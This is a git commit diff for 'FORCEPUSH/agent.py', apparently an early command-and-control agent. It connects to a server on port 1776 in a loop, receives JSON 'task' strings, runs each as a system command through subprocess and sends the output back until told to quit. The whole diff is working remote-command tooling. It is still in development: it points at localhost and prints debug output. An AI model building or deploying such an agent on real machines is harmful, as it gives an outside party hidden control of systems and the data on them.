cb4a0e01842c2a2cbf242a523e00b0bf44bea874
root <root@localhost.localdomain>
2020-09-20 12:20:25 -0400

    can return command output now.. just need to get server to accept it

--- FORCEPUSH/agent.py
+++ FORCEPUSH/agent.py
@@ -3,46 +3,48 @@ import sys
 import json
 import time
 import uuid
-import os
+import subprocess
 
 time.sleep(0)
 uuid = uuid.uuid4()
 MsgNum = 0
-
 
 def GenMsg(x):
     if (x == 0):
         NewMsgJ = '{"id": 0, "name": "test", "Type": "init"}'
         NewMsg = str.encode(NewMsgJ)
     else:
-        cmd_to_run = x
-        cmd_results = os.system(cmd_to_run)
-        NewMsg = cmd_results
+        reformat = x.split(" ")
+        print(reformat)
+        output = subprocess.Popen(reformat,stdout=subprocess.PIPE).communicate()[0]
+        print(output)
+        NewMsg = output.decode("utf-8")
     return NewMsg
 
 
 Msg = GenMsg(MsgNum)
 
-HOST, PORT = "localhost", 1776
-sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-try:
-    # Connect to server and send data
-    sock.connect((HOST, PORT))
-    sock.sendall(Msg)
+while True:
+    HOST, PORT = "localhost", 1776
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    try:
+        sock.connect((HOST, PORT))
+        sock.sendall(Msg)
+        print("Sending:     {}".format(Msg))
 
-    # Receive data from the server and shut down
-    received = sock.recv(1024)
-    
-    while (received != "quit"):
-        raw_receive = received.decode()
-        receive = json.loads(raw_receive)
-        Msg2 = GenMsg(receive["task"]
-        sock.sendall(Msg2)
-        continue
+        received = sock.recv(1024)
+        print("Recevied:    {}".format(received))
+        raw_received = received.decode()
+        receive = json.loads(raw_received)
+        if (receive["task"] != "quit"):
+            MsgDraft = GenMsg(receive["task"])
+            Msg = str.encode(MsgDraft)
+        else:
+            exit()
 
-finally:
-    sock.close()
+    finally:
+        sock.close()
+    continue
 
-print("Sent:     {}".format(Msg))
-print("Received: {}".format(received))
+print("Closing...")
